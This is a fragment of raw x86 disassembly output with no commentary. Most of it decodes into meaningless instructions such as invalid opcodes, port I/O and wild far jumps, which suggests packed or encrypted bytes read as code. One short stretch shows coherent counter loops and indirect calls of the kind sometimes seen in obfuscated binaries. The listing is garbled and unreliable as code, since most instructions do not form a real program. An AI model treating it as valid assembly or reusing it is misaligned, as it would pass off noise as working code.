  40379b:	sbb    bh,BYTE PTR [edx+0x73]
  40379e:	jg     0x403807
  4037a0:	cli    
  4037a1:	and    eax,0x1afb8535
  4037a6:	cdq    
  4037a7:	pop    ebx
  4037a8:	or     eax,0xcf624a9f
  4037ad:	int    0x96
  4037af:	and    DWORD PTR [ebx-0x3d780531],ebx
  4037b5:	xchg   ecx,eax
  4037b6:	xor    al,0xb4
  4037b8:	outs   dx,DWORD PTR ds:[esi]
  4037b9:	push   ebx
  4037ba:	ins    DWORD PTR es:[edi],dx
  4037bb:	jne    0x403786
  4037bd:	nop
  4037be:	lods   eax,DWORD PTR ds:[esi]
  4037bf:	ins    DWORD PTR es:[edi],dx
  4037c0:	xor    al,0xfd
  4037c2:	adc    edx,DWORD PTR [esi-0x7]
  4037c5:	dec    eax
  4037c6:	(bad)  
  4037c8:	hlt    
  4037c9:	pop    ecx
  4037ca:	cs stos BYTE PTR es:[edi],al
  4037cc:	sub    bl,al
  4037ce:	jae    0x403847
  4037d0:	xor    bl,dl
  4037d2:	bound  eax,QWORD PTR [esi+0x73aa49df]
  4037d8:	add    al,0x23
  4037da:	iret   
  4037db:	fbld   TBYTE PTR [ecx+0x1813f3fe]
  4037e1:	ss or  al,0x6e
  4037e4:	or     bl,ch
  4037e6:	jp     0x403829
  4037e8:	ins    DWORD PTR es:[edi],dx
  4037e9:	retf   0x7e40
  4037ec:	sub    eax,0xab508a6b
  4037f1:	xchg   al,dh
  4037f3:	xchg   esi,eax
  4037f4:	iret   
  4037f5:	out    0xae,eax
  4037f7:	push   edi
  4037f8:	int3   
  4037f9:	pop    ecx
  4037fa:	jmp    0x2f8a562b
  4037ff:	and    DWORD PTR [edx-0x3d44a495],ecx
  403805:	xor    DWORD PTR [edi],esp
  403807:	jmp    0x40378f
  403809:	fldcw  WORD PTR [ecx-0x5bdc4c91]
  40380f:	adc    eax,0xd8a848e6
  403814:	dec    eax
  403815:	xchg   esi,eax
  403816:	mov    ebx,0xe5373a7f
  40381b:	out    0x9d,eax
  40381d:	cs icebp 
  40381f:	js     0x403890
  403821:	pop    esi
  403822:	cmp    bh,dl
  403824:	mov    ecx,0xb9433947
  403829:	mov    gs,esp
  40382b:	push   es
  40382c:	sbb    ah,BYTE PTR [ecx]
  40382e:	test   DWORD PTR [edx+edx*4-0x3e],esi
  403832:	xor    eax,0xeae603af
  403837:	mov    dl,0xa1
  403839:	pop    ebx
  40383a:	xchg   esp,eax
  40383b:	pop    ebp
  40383c:	dec    ebp
  40383d:	push   es
  40383e:	inc    esi
  40383f:	not    BYTE PTR [ebx+edx*4+0x65]
  403843:	bound  esp,QWORD PTR [esi]
  403845:	push   0x66
  403847:	dec    esi
  403848:	popa   
  403849:	pop    edi
  40384a:	mov    al,ds:0x96cbf51c
  40384f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403850:	sbb    dl,BYTE PTR [edi]
  403852:	cli    
  403853:	xchg   ebp,eax
  403854:	ins    BYTE PTR es:[edi],dx
  403855:	add    esp,DWORD PTR [edx-0x2f]
  403858:	pop    edx
  403859:	push   eax
  40385a:	dec    edi
  40385b:	add    eax,0xce8bc1f9
  403860:	adc    ch,BYTE PTR [esi-0x271ebc8e]
  403866:	retf   0x61ec
  403869:	(bad)  
  40386a:	jle    0x4038eb
  40386c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40386d:	cmp    eax,0xded71e80
  403872:	sub    edx,DWORD PTR [esi-0x17e6aac9]
  403878:	cdq    
  403879:	and    al,ah
  40387b:	sub    ebp,DWORD PTR [ecx]
  40387d:	aaa    
  40387e:	sbb    bl,ch
  403880:	fwait
  403881:	cld    
  403882:	leave  
  403883:	mov    al,0xed
  403885:	mov    cl,BYTE PTR [esi-0xd1b6957]
  40388b:	xor    ebp,DWORD PTR [ecx+0x4c]
  40388e:	fxch   st(3)
  403890:	ror    BYTE PTR [esi],1
  403892:	retf   0xe00f
  403895:	dec    esp
  403896:	jg     0x403916
  403898:	aas    
  403899:	(bad)  
  40389a:	sub    BYTE PTR [ecx+0x513553d2],bl
  4038a0:	push   0x607b4fd5
  4038a5:	adc    ecx,DWORD PTR [edi]
  4038a7:	sahf   
  4038a8:	aam    0x1e
  4038aa:	dec    edi
  4038ab:	push   cs
  4038ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ad:	out    0x8e,eax
  4038af:	jge    0x403925
  4038b1:	mov    es,esi
  4038b3:	mov    dh,0xe4
  4038b5:	aad    0xb8
  4038b7:	cmp    DWORD PTR [esi+0x1d5336e2],0xd3d18c20
  4038c1:	test   al,0x43
  4038c3:	mov    esp,0xa1e5d755
  4038c8:	xchg   edx,eax
  4038c9:	in     eax,0x85
  4038cb:	in     al,dx
  4038cc:	add    ecx,DWORD PTR [ebx+0x21]
  4038cf:	outs   dx,DWORD PTR ds:[esi]
  4038d0:	retf   0x3020
  4038d3:	sahf   
  4038d4:	scas   al,BYTE PTR es:[edi]
  4038d5:	xchg   ebx,eax
  4038d6:	mov    ecx,0x2437ee45
  4038db:	or     eax,0x5a96e31f
  4038e0:	cli    
  4038e1:	aaa    
  4038e2:	and    cl,ch
  4038e4:	icebp  
  4038e5:	sar    BYTE PTR [ebx+0x34d349c6],0xad
  4038ec:	xor    eax,edi
  4038ee:	add    ebx,DWORD PTR [ebp+0x461fa9e2]
  4038f4:	imul   eax,DWORD PTR [esi+0xfb8c688],0x7e
  4038fb:	adc    al,0xd2
  4038fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038fe:	pmuludq mm7,QWORD PTR ds:0xd8f2d041
  403905:	add    BYTE PTR [edi+0x482906f4],dh
  40390b:	repnz xchg edi,eax
  40390d:	(bad)  
  40390e:	xchg   ecx,eax
  40390f:	int    0xe5
  403911:	ror    DWORD PTR [edx-0x66],1
  403914:	xor    eax,DWORD PTR [eax-0xb]
  403917:	shr    DWORD PTR [edx-0x25],1
  40391a:	ss inc eax
  40391c:	jbe    0x4038e3
  40391e:	nop
  40391f:	xor    ch,BYTE PTR [edx+0x4e]
  403922:	mov    dh,0xc4
  403924:	mov    ecx,0x94436493
  403929:	(bad)  
  40392a:	test   DWORD PTR [esi-0x2b1b1322],0x47b2df69
  403934:	cmp    edx,edi
  403936:	je     0x40398a
  403938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403939:	mov    al,0x6b
  40393b:	pop    edx
  40393c:	push   ecx
  40393d:	inc    eax
  40393e:	sbb    al,0x41
  403940:	xchg   edx,eax
  403941:	std    
  403942:	add    dl,al
  403944:	popf   
  403945:	scas   al,BYTE PTR es:[edi]
  403946:	scas   eax,DWORD PTR es:[edi]
  403947:	mov    dh,0x9c
  403949:	push   esi
  40394a:	push   eax
  40394b:	jp     0x40392b
  40394d:	loope  0x4038f9
  40394f:	retf   0xdbc7
  403952:	enter  0x3fc5,0xbd
  403956:	or     al,0x97
  403958:	dec    esi
  403959:	cmp    DWORD PTR [ecx-0x65c26358],esp
  40395f:	fwait
  403960:	inc    edx
  403961:	add    ebx,DWORD PTR [edi+0x64dd72ff]
  403967:	hlt    
  403968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403969:	or     eax,0x4873f98d
  40396e:	bsr    esp,DWORD PTR [ebp-0x3293ac74]
  403975:	cdq    
  403976:	xor    ah,0x51
  403979:	push   eax
  40397a:	sub    DWORD PTR [edx+0x3f29148a],0xffffffd1
  403981:	pop    edx
  403982:	mov    al,ds:0x51c2dfc3
  403987:	sbb    BYTE PTR [edi],bh
  403989:	pop    edx
  40398a:	mov    ebx,DWORD PTR [eax]
  40398c:	and    bh,ch
  40398e:	jge    0x4039d0
  403990:	inc    eax
  403991:	jle    0x40392e
  403993:	cwde   
  403994:	dec    esp
  403995:	in     eax,0xf7
  403997:	cmp    eax,0x5c5da771
  40399c:	stos   DWORD PTR es:[edi],eax
  40399d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40399e:	fcmovnbe st,st(6)
  4039a0:	mov    esi,0xa4a0348b
  4039a5:	loope  0x4039c5
  4039a7:	cmp    esp,edx
  4039a9:	add    BYTE PTR [edi-0x20f9c02b],bh
  4039af:	mov    bh,0x60
  4039b1:	into   
  4039b2:	jp     0x403a25
  4039b4:	jl     0x4039b8
  4039b6:	fld    DWORD PTR [edx-0x414e068c]
  4039bc:	addr16 daa 
  4039be:	es adc al,0x1c
  4039c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c2:	clc    
  4039c3:	mov    esi,DWORD PTR [edi]
  4039c5:	test   BYTE PTR [ebp-0x24452c38],ah
  4039cb:	inc    ebp
  4039cc:	add    eax,0x573464a4
  4039d1:	pop    ebp
  4039d2:	push   ecx
  4039d3:	push   0x9bb6dfd4
  4039d8:	xor    DWORD PTR [ebx-0x66],esi
  4039db:	sti    
  4039dc:	adc    BYTE PTR [ebx+0x3d],al
  4039df:	retf   
  4039e0:	xor    bh,bl
  4039e2:	xchg   DWORD PTR [ebp+0x616e8d82],eax
  4039e8:	loopne 0x4039a1
  4039ea:	into   
  4039eb:	inc    eax
  4039ec:	jmp    0x401f534c
  4039f1:	push   ebp
  4039f2:	push   cs
  4039f3:	out    dx,al
  4039f4:	fidivr WORD PTR ds:0x44e33e1b
  4039fa:	lock pop ecx
  4039fc:	push   ebp
  4039fd:	pusha  
  4039fe:	mov    bh,0xe4
  403a00:	stos   BYTE PTR es:[edi],al
  403a01:	mov    WORD PTR [edi+0x7cd5d040],es
  403a07:	je     0x403a50
  403a09:	xchg   edi,eax
  403a0a:	xchg   edx,eax
  403a0b:	jae    0x403a74
  403a0d:	lds    ecx,FWORD PTR [ebx+0x1d8bf045]
  403a13:	jmp    0x8b407cbb
  403a18:	sbb    ecx,DWORD PTR [ecx]
  403a1a:	sbb    eax,0x42a2f5
  403a1f:	xor    eax,esi
  403a21:	and    DWORD PTR ds:0x42a2dd,0x0
  403a2b:	jmp    0x403a3f
  403a30:	xor    ebx,ebx
  403a32:	or     ebx,DWORD PTR ds:0x42a2dd
  403a38:	inc    ebx
  403a39:	mov    DWORD PTR ds:0x42a2dd,ebx
  403a3f:	cmp    DWORD PTR ds:0x42a2dd,0x1e
  403a46:	jae    0x403a74
  403a4c:	cmp    DWORD PTR ds:0x42a2dd,0x21
  403a53:	jne    0x403a6d
  403a59:	push   DWORD PTR [ebp-0xc]
  403a5c:	push   DWORD PTR [ebp-0x1c]
  403a5f:	push   DWORD PTR [ebp-0xc]
  403a62:	push   0x42a5c5
  403a67:	call   DWORD PTR ds:0x4251d0
  403a6d:	jmp    0x403a30
  403a72:	sub    ebx,ebx
  403a74:	add    eax,edi
  403a76:	or     DWORD PTR ds:0x42a3f5,0x53c
  403a80:	mov    DWORD PTR [ebp-0xc],eax
  403a83:	and    DWORD PTR ds:0x42a335,0x0
  403a8d:	jmp    0x403a9f
  403a92:	mov    ebx,DWORD PTR ds:0x42a335
  403a98:	inc    ebx
  403a99:	mov    DWORD PTR ds:0x42a335,ebx
  403a9f:	cmp    DWORD PTR ds:0x42a335,0x1a
  403aa6:	jae    0x403fef
  403aac:	cmp    DWORD PTR ds:0x42a335,0x29
  403ab3:	jne    0x403ad9
  403ab9:	push   DWORD PTR [ebp-0x20]
  403abc:	push   0x42a3cd
  403ac1:	push   DWORD PTR [ebp-0x10]
  403ac4:	push   0x42a4e6
  403ac9:	push   0x2897
  403ace:	push   0x7575
  403ad3:	call   DWORD PTR ds:0x4251d4
  403ad9:	jmp    0x403a92
  403ade:	add    DWORD PTR ds:0x42a371,edx
  403ae4:	jmp    0x403fef
  403ae9:	iret   
  403aea:	ror    edi,1
  403aec:	aas    
  403aed:	rol    ecx,1
  403aef:	iret   
  403af0:	rcl    DWORD PTR [ebx+0x19],1
  403af3:	and    esp,DWORD PTR cs:[ebx]
  403af6:	push   0x21e847f5
  403afb:	js     0x403b75
  403afd:	push   0x7c
  403aff:	js     0x403b79
  403b01:	xchg   ebp,eax
  403b02:	jge    0x403af2
  403b04:	fwait
  403b05:	cli    
  403b06:	xor    al,BYTE PTR [ebp+0x7caa22ea]
  403b0c:	fisttp DWORD PTR [edi]
  403b0e:	mov    al,0x8d
  403b10:	mov    ecx,0xfcccaba7
  403b15:	aam    0x16
  403b17:	ret    
  403b18:	add    eax,0xcdc7106f
  403b1d:	sub    DWORD PTR [eax+0x65],0xffffffd8
  403b21:	xchg   edx,eax
  403b22:	scas   al,BYTE PTR es:[edi]
  403b23:	inc    ebp
  403b24:	mov    ds:0xe2188a98,eax
  403b29:	jne    0x403ad4
  403b2b:	(bad)  
  403b2c:	mov    bh,0x42
  403b2e:	dec    edi
  403b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b30:	fnstsw WORD PTR [ecx]
  403b32:	lahf   
  403b33:	adc    eax,0xad422282
  403b38:	pop    es
  403b39:	fnsave [edi]
  403b3b:	xor    cl,cl
  403b3d:	shl    DWORD PTR [esp+edi*8],cl
  403b40:	pop    ss
  403b41:	adc    ah,al
  403b43:	pop    ebp
  403b44:	inc    ebp
  403b45:	and    ecx,DWORD PTR [edi+0x22]
  403b48:	xchg   BYTE PTR [ecx-0x151bc924],dl
  403b4e:	dec    edi
  403b4f:	mov    eax,eax
  403b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b52:	repz clc 
  403b54:	sbb    DWORD PTR [ebp+0x1f6532b7],0xffffff9d
  403b5b:	adc    eax,0x8efd66d8
  403b60:	inc    ebx
  403b61:	pop    esp
  403b62:	and    bh,0xab
  403b65:	gs xor eax,0xdc0d7279
  403b6b:	ins    BYTE PTR es:[edi],dx
  403b6c:	std    
  403b6d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  403b6f:	mov    ebx,0xe4ba7431
  403b74:	xchg   ebx,eax
  403b75:	fdiv   DWORD PTR [eax-0x4c8cb222]
  403b7b:	fadd   DWORD PTR [ecx-0x27]
  403b7e:	mov    bl,0x87
  403b80:	rcl    ecx,0x65
  403b83:	stos   BYTE PTR es:[edi],al
  403b84:	repnz aaa 
  403b86:	jl     0x403bc8
  403b88:	jge    0x403b73
  403b8a:	sbb    ebp,DWORD PTR [eax+0x61]
  403b8d:	cmp    ebp,edx
  403b8f:	jmp    0xd9c5042c
  403b94:	pushf  
  403b95:	cmp    ch,ah
  403b97:	(bad)  
  403b98:	icebp  
  403b99:	xchg   ebp,eax
  403b9a:	xchg   esp,edi
  403b9c:	push   edi
  403b9d:	dec    ebp
  403b9e:	pusha  
  403b9f:	pop    edi
  403ba0:	xchg   ebx,eax
  403ba1:	mov    esi,0x9d76432d
  403ba6:	sub    ecx,DWORD PTR [ebx-0x26bf0a9c]
  403bac:	out    dx,al
  403bad:	push   es
  403bae:	lahf   
  403baf:	hlt    
  403bb0:	inc    esi
  403bb1:	jecxz  0x403b88
  403bb3:	add    cl,dl
  403bb5:	hlt    
  403bb6:	mov    gs:0xae784e17,eax
  403bbc:	mov    cs,WORD PTR [ebp-0x2f]
  403bbf:	int3   
  403bc0:	mov    ch,BYTE PTR [ebp+ebx*1+0x38451109]
  403bc7:	jo     0x403c39
  403bc9:	(bad)  
  403bca:	lea    ebp,fs:[esi]
  403bcd:	jl     0x403bbb
  403bcf:	sub    eax,ecx
  403bd1:	es add dh,al
  403bd4:	mov    ds:0xbf61b5e7,eax
  403bd9:	xchg   ebp,eax
  403bda:	rcl    DWORD PTR gs:[edx-0x6f4beb96],cl
  403be1:	dec    eax
  403be2:	retf   
  403be3:	stos   BYTE PTR es:[edi],al
  403be4:	(bad)  
  403be6:	push   ecx
  403be7:	ret    0x5533
  403bea:	sbb    BYTE PTR [esi-0x51],0xd8
  403bee:	pusha  
  403bef:	(bad)  
  403bf0:	sar    DWORD PTR [eax+0x21cd0af5],1
  403bf6:	in     al,0xdc
  403bf8:	cmp    eax,0x157433bd
  403bfd:	inc    ecx
  403bfe:	add    DWORD PTR [esi],ebp
  403c00:	cmp    eax,0x79a3e4a4
  403c05:	test   eax,0xffe65b69
  403c0a:	pusha  
  403c0b:	or     DWORD PTR [eax],esi
  403c0d:	sbb    eax,DWORD PTR [edi+0xd09454f]
  403c13:	cmp    eax,0x3b9163f8
  403c18:	loope  0x403c8d
  403c1a:	aas    
  403c1b:	fwait
  403c1c:	cwde   
  403c1d:	dec    edi
  403c1e:	fidivr WORD PTR [esp+ecx*4-0x22]
  403c22:	inc    ebp
  403c23:	and    DWORD PTR [ebp+0x7c4d9340],ecx
  403c29:	jbe    0x403c53
  403c2b:	retf   0x46da
  403c2e:	call   0xaf8b:0xd84976d1
  403c35:	adc    BYTE PTR ds:0x80ac6ec9,dl
  403c3b:	scas   al,BYTE PTR es:[edi]
  403c3c:	sbb    al,0xae
  403c3e:	shr    BYTE PTR [edx+edi*8-0x4a],cl
  403c42:	test   DWORD PTR [edi+0x47afd107],edi
  403c48:	sub    BYTE PTR [ecx+edx*2+0x73],ah
  403c4c:	or     BYTE PTR [edx],0xbd
  403c4f:	int3   
  403c50:	lods   al,BYTE PTR ds:[esi]
  403c51:	aam    0x69
  403c53:	adc    al,0x70
  403c55:	or     al,0x1f
  403c57:	rcr    eax,0x11
  403c5a:	loopne 0x403c21
  403c5c:	ja     0x403c04
  403c5e:	mov    BYTE PTR [edx],ch
  403c60:	cli    
  403c61:	sub    BYTE PTR [edi-0x436fa76],dl
  403c67:	mov    WORD PTR [edx],es
  403c69:	and    edi,edi
  403c6b:	aas    
  403c6c:	adc    eax,0x892af0e9
  403c71:	loope  0x403c1b
  403c73:	inc    edx
  403c74:	mov    eax,ds:0xc2bf8c48
  403c79:	pop    ebx
  403c7a:	ret    
  403c7b:	sub    eax,0x91f662e3
  403c80:	outs   dx,DWORD PTR ds:[esi]
  403c81:	call   0x3f38:0x88c34dad
  403c88:	test   eax,0xd9f7ed4a
  403c8d:	das    
  403c8e:	sbb    dl,BYTE PTR [ebx]
  403c90:	push   esi
  403c91:	dec    ebp
  403c92:	jmp    0xff2c5ca
  403c97:	addr16 sub eax,0xd8e6cae6
  403c9d:	xor    DWORD PTR [ebx-0x7d],edx
  403ca0:	jg     0x403c7f
  403ca2:	mov    ch,0x25
  403ca4:	inc    eax
  403ca5:	push   ecx
  403ca6:	(bad)  
  403ca7:	cmp    eax,0x29ac7de9
  403cac:	sahf   
  403cad:	mov    esp,0x1cf6dc1e
  403cb2:	jge    0x403c66
  403cb4:	mov    ebx,0x55c1bc4e
  403cb9:	dec    ebp
  403cba:	mov    al,ds:0x7baa469d
  403cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc0:	jge    0x403c92
  403cc2:	cli    
  403cc3:	jle    0x403c62
  403cc5:	not    bl
  403cc7:	out    dx,al
  403cc8:	xchg   BYTE PTR [ebx-0x1d0e1e85],dh
  403cce:	jmp    0x861d:0x2df873bd
  403cd5:	arpl   WORD PTR [eax-0x4e99ebb6],bx
  403cdb:	cmp    DWORD PTR [edx-0x55],eax
  403cde:	push   ebp
  403cdf:	clc    
  403ce0:	fwait
  403ce1:	mov    esp,0x65362d1f
  403ce6:	cmp    dh,BYTE PTR [ebx]
  403ce8:	xchg   edx,eax
  403ce9:	sahf   
  403cea:	and    ebp,edx
  403cec:	pop    edx
  403ced:	scas   eax,DWORD PTR es:[edi]
  403cee:	push   es
  403cef:	pop    edx
  403cf0:	sbb    DWORD PTR [ecx-0x3b4b3529],0xffffff9c
  403cf7:	and    cl,bh
  403cf9:	in     al,0xf6
  403cfb:	or     cl,BYTE PTR [ebp-0x12c5fb65]
  403d01:	ror    esi,0x64
  403d04:	or     al,0x5d
  403d06:	inc    edi
  403d07:	or     DWORD PTR [ecx-0x152d8be8],esp
  403d0d:	or     edx,DWORD PTR [esi-0x47]
  403d10:	rcr    dh,1
  403d12:	jle    0x403cfc
  403d14:	xor    DWORD PTR [ebp+0x53],eax
  403d17:	shr    DWORD PTR [esi-0x6328f83f],cl
  403d1d:	add    DWORD PTR [edi],eax
  403d1f:	aad    0x4b
  403d21:	mov    edx,esp
  403d23:	mov    eax,0x53249560
  403d28:	dec    ebp
  403d29:	retf   0x27d1
  403d2c:	ret    0xbd20
  403d2f:	adc    bh,cl
  403d31:	clc    
  403d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d33:	push   es
  403d34:	mov    bl,0xd7
  403d36:	pop    esi
  403d37:	repz push edx
  403d39:	push   ds
  403d3a:	pop    esp
  403d3b:	inc    ecx
  403d3c:	jbe    0x403d24
  403d3e:	mov    WORD PTR [edx+0xa6bbc0d],gs
  403d44:	jl     0x403ce1
  403d46:	ins    BYTE PTR es:[edi],dx
  403d47:	jne    0x403d7f
  403d49:	daa    
  403d4a:	sub    ebx,ebx
  403d4c:	xchg   edi,eax
  403d4d:	loopne 0x403da3
  403d4f:	repz sbb DWORD PTR [ebp+0x5c],esi
  403d53:	xchg   esp,eax
  403d54:	hlt    
  403d55:	ins    BYTE PTR es:[edi],dx
  403d56:	push   ebp
  403d57:	pop    ebx
  403d58:	jae    0x403d8d
  403d5a:	mov    esp,0xe8327f46
  403d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d60:	xor    cl,BYTE PTR [ebp+0x650809db]
  403d66:	adc    DWORD PTR [esi+0x4c],ebp
  403d69:	imul   eax,DWORD PTR [esi+0x0],0x9192bca
  403d70:	ret    0x826d
  403d73:	push   0xe46240bd
  403d78:	xchg   ebx,eax
  403d79:	sub    al,0x18
  403d7c:	lahf   
  403d7d:	sub    eax,0xfd30fd0d
  403d82:	rcr    DWORD PTR [esi-0x4be545a6],cl
  403d88:	sub    DWORD PTR [edi-0x466613f9],eax
  403d8e:	fcom   DWORD PTR [edx+edx*1-0x28]
  403d92:	ja     0x403e06
  403d94:	test   al,0xd2
  403d96:	jmp    0xad1ed5bd
  403d9b:	test   BYTE PTR [ecx+ecx*1],ah
  403d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d9f:	test   eax,0xe816517b
  403da4:	imul   eax,DWORD PTR [esi+0x6b],0xfffffffb
  403da8:	or     BYTE PTR [edi],ah
  403daa:	pop    ss
  403dab:	adc    dl,bh
  403dad:	lahf   
  403dae:	pop    esi
  403daf:	ror    DWORD PTR ds:0xdb62bf30,0x23
  403db6:	push   edi
  403db7:	js     0x403e02
  403db9:	cli    
  403dba:	jmp    DWORD PTR [edx-0x7ecab507]
  403dc0:	push   eax
  403dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dc2:	adc    eax,0x676a7765
  403dc7:	add    DWORD PTR [ebx+ecx*1+0x375f42d2],0x86311cf6
  403dd2:	and    al,0x22
  403dd4:	push   eax
  403dd5:	adc    al,BYTE PTR [di]
  403dd8:	and    eax,0xcc11034e
  403ddd:	lods   al,BYTE PTR ds:[esi]
  403dde:	or     eax,0x9bc5fbdc
  403de3:	popa   
  403de4:	popf   
  403de5:	adc    al,0xb1
  403de7:	and    eax,0x1e62eae5
  403dec:	(bad)  
  403ded:	or     ah,BYTE PTR [ecx+0x7a55208f]
  403df3:	or     al,0x4e
  403df5:	lock jnp 0x403e62
  403df8:	in     al,0xb2
  403dfa:	mov    dh,0xda
  403dfc:	aaa    
  403dfd:	popa   
  403dfe:	xchg   ecx,eax
  403dff:	clc    
  403e00:	mov    ds:0x16252757,eax
  403e05:	call   0x1b0e:0x77e73f4
  403e0c:	not    al
  403e0e:	scas   al,BYTE PTR es:[edi]
  403e0f:	push   esi
  403e10:	mov    dl,0x86
  403e12:	push   ebx
  403e13:	mov    BYTE PTR [esi+0x7e],dl
  403e16:	je     0x403e91
  403e18:	mov    cl,0xf9
  403e1a:	jl     0x403e48
  403e1c:	out    dx,eax
  403e1d:	pop    esi
  403e1e:	jnp    0x403e25
  403e20:	sbb    al,0x97
  403e22:	sub    ebx,ecx
  403e24:	imul   esp,ecx,0xf16b9dc1
  403e2a:	cmp    edi,DWORD PTR [esi+0x23676ff4]
  403e30:	cvttps2pi mm1,QWORD PTR [edi+0x42fad93c]
  403e37:	sbb    esp,ecx
  403e39:	push   0xffffffeb
  403e3b:	popa   
  403e3c:	and    ebp,ecx
  403e3e:	sbb    BYTE PTR [ebp+0x5676f721],al
  403e44:	std    
  403e45:	push   esi
  403e46:	jmp    0x676909d9
  403e4b:	mov    cl,0xa
  403e4d:	push   ebx
  403e4e:	js     0x403e5b
  403e50:	jecxz  0x403e33
  403e52:	loop   0x403e1f
  403e54:	sbb    ebx,DWORD PTR [ecx+eiz*2]
  403e57:	scas   eax,DWORD PTR es:[edi]
  403e58:	pop    ebx
  403e59:	mov    edx,0xadf92eff
  403e5e:	mov    es,WORD PTR [eax+0x6e]
  403e61:	outs   dx,DWORD PTR ds:[esi]
  403e62:	sub    ah,0x8f
  403e65:	push   ds
  403e66:	sbb    DWORD PTR [edx],0x2b
  403e69:	test   al,0x39
  403e6b:	mov    bh,0x45
  403e6d:	xchg   esp,eax
  403e6e:	test   BYTE PTR [esi-0x1506e36b],cl
  403e74:	xchg   DWORD PTR [esi],eax
  403e76:	add    BYTE PTR [edi+0x28],bl
  403e79:	and    eax,0x4bfe0667
  403e7e:	dec    edx
  403e7f:	push   eax
  403e80:	sbb    eax,0xe9ecfb2d
  403e85:	stos   BYTE PTR es:[edi],al
  403e86:	xchg   ebx,eax
  403e87:	test   BYTE PTR [eax-0x62],0x1
  403e8b:	cmp    BYTE PTR [eax+0x29895177],ah
  403e91:	mov    dh,0x92
  403e93:	inc    esi
  403e94:	int3   
  403e95:	push   ecx
  403e96:	mov    DWORD PTR [ebp+eiz*1-0x29a7d62a],0xe3cf1ddc
  403ea1:	fldenv [eax-0x4836df0e]
  403ea7:	xchg   ecx,eax
  403ea8:	mov    edx,0x51cfb608
  403ead:	pop    esp
  403eae:	sti    
  403eaf:	push   esi
  403eb0:	or     ch,BYTE PTR [esi+0x54c8f25a]
  403eb6:	(bad)  
  403eb7:	cmp    al,0x46
  403eb9:	imul   esp,DWORD PTR [eax+0x44],0x3f
  403ebd:	sub    eax,0x91900f6
  403ec2:	pop    ebx
  403ec3:	mov    ss,edx
  403ec5:	adc    dh,BYTE PTR [eax]
  403ec7:	ficom  DWORD PTR [edx+0x48]
  403eca:	repnz lea ebx,[ecx-0x2f9fd4e1]
  403ed1:	retf   0x4278
  403ed4:	retf   0x5c07
  403ed7:	mov    dh,0xbf
  403ed9:	pop    edx
  403eda:	sub    al,0x8b
  403edc:	mov    ebp,0xb3e9463d
  403ee1:	les    esp,FWORD PTR [ebp-0x3215e206]
  403ee7:	mov    bl,0xfe
  403ee9:	stos   BYTE PTR es:[edi],al
  403eea:	repnz fadd st,st(1)
  403eed:	test   BYTE PTR [edx],bh
  403eef:	ret    
  403ef0:	mov    ds:0xb305f207,eax
  403ef5:	mov    dh,0x8b
  403ef7:	scas   al,BYTE PTR es:[edi]
  403ef8:	dec    edx
  403ef9:	cld    
  403efa:	sbb    eax,0x93b98b76
  403eff:	ret    0x85c
  403f02:	pushf  
  403f03:	or     al,0x55
  403f05:	push   0x15c21c4d
  403f0a:	loope  0x403f77
  403f0c:	or     esi,edx
  403f0e:	push   ebx
  403f0f:	jl     0x403f8d
  403f11:	mov    cl,0x8c
  403f13:	stos   BYTE PTR es:[edi],al
  403f14:	imul   ebp,DWORD PTR [esi+0x22],0xfffffff1
  403f18:	test   al,0xf9
  403f1a:	scas   eax,DWORD PTR es:[edi]
  403f1b:	or     eax,0x51473890
  403f20:	in     eax,0xc6
  403f22:	xchg   esp,eax
  403f23:	mov    WORD PTR [ecx],ss
  403f25:	dec    esi
  403f26:	or     esp,DWORD PTR [edi]
  403f28:	push   eax
  403f29:	adc    bh,dl
  403f2b:	sbb    DWORD PTR [ebp+0x32],eax
  403f2e:	addr16 jno 0x403ed4
  403f31:	out    dx,eax
  403f32:	mov    DWORD PTR [ebp+0x5b264824],edx
  403f38:	call   ebx
  403f3a:	inc    eax
  403f3b:	mov    esp,0xb6570f4f
  403f40:	mov    dh,0x9c
  403f42:	xchg   ebx,eax
  403f43:	add    edi,DWORD PTR [esi-0x4ef1dee3]
  403f49:	loope  0x403fc3
  403f4b:	outs   dx,DWORD PTR ds:[esi]
  403f4c:	aas    
  403f4d:	cmp    al,0x84
  403f4f:	sbb    al,0x66
  403f51:	adc    ch,BYTE PTR [ecx]
  403f53:	js     0x403f3e
  403f55:	or     esi,DWORD PTR [esp+ebp*1]
  403f58:	mov    ecx,0x860531fa
  403f5d:	dec    edx
  403f5e:	int    0xa5
  403f60:	out    dx,al
  403f61:	mov    WORD PTR [edx+0x5188f286],ds
  403f67:	shr    BYTE PTR fs:[edx],0xc
  403f6b:	js     0x403fad
  403f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f6e:	nop
  403f6f:	and    DWORD PTR [ecx-0x220423b0],esi
  403f75:	or     bh,BYTE PTR [edx-0x267a531f]
  403f7b:	ror    edi,0x74
  403f7e:	fisubr DWORD PTR [edi+0x53be6c9a]
  403f84:	in     al,0x45
  403f86:	(bad)  
  403f88:	ja     0x403fad
  403f8a:	jbe    0x403f0d
  403f8c:	retf   
  403f8d:	jb     0x403f6e
  403f8f:	jge    0x403fbb
  403f91:	ror    DWORD PTR [edi+ebp*2-0x6f],0x9
  403f96:	sub    eax,0x41252955
  403f9b:	inc    ebp
  403f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f9d:	addr16 jle 0x404002
  403fa0:	cmp    BYTE PTR ds:0x8873f97a,0xee
  403fa7:	lock cmc 
  403fa9:	call   0xe3eb:0xedb7ef52
  403fb0:	jecxz  0x403fbd
  403fb2:	iret   
  403fb3:	stos   DWORD PTR es:[edi],eax
